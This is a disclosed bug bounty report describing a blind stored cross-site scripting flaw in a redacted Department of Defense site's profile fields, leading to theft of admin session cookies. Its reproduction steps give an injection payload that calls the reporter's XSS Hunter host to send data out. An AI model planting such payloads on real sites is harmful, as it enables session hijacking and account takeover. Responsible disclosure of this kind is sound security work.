# Blind Stored XSS on ███████  leads to takeover admin account

## Report Details
- **Report ID**: 1110243
- **URL**: https://hackerone.com/reports/1110243
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-02-24T15:52:45.485Z
- **Disclosed**: 2021-03-11T20:46:21.071Z

## Reporter
- **Username**: hemantsolo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Hello Team,
I am Hemant Patidar working as a security researcher and I found a bug in your site.
Report of bug is as follows:-

##Vulnerable URL:
https://████████/

##Description:
I have found that various field of the profile page is not properly configured to wipe out HTML tags and Javascript code which leads to store the blind XSS payload in the first name, last name, title etc. and whenever the admin will check the profile the code will fire and we will get response in the XSS Hunter along with the screenshot of the admin side, IP and cookies and other sensitive information.

POC: 
XSS Hunter report attached.

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customers and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to the URL by opening your account: https://█████/█████████
2. Now enter the below payload in the First name, last name, company name and title: data: "><img src="https://hemantsolo.xss.ht>/index.html?c=hemantsolo_xss" />
3. Now wait for some time you will get an XSS fire email via XSS hunter along with the screenshot and other sensitive info.

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
